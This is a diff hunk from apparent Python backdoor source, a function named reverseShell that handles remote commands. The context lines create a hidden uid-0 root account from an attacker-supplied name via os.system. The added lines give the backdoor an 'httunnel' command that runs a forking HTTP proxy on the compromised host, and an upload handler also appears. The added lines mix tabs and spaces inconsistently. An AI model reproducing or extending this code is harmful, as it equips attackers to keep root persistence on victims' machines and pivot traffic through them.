@@ -762,7 +762,11 @@ def reverseShell():
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
-            conn.send("[+] Root account " + acct + " has been created.")   
+            conn.send("[+] Root account " + acct + " has been created.")
+        elif cmd == ("httunnel"):
+	    httpd = SocketServer.ForkingTCPServer(('', HPORT), Proxy)
+            conn.send("[+] Serving HTTP proxy on port %s" % HPORT)
+	    httpd.serve_forever()  
         elif cmd.startswith('upload'):
             getname = cmd.split(" ")
             rem_file = getname[1]
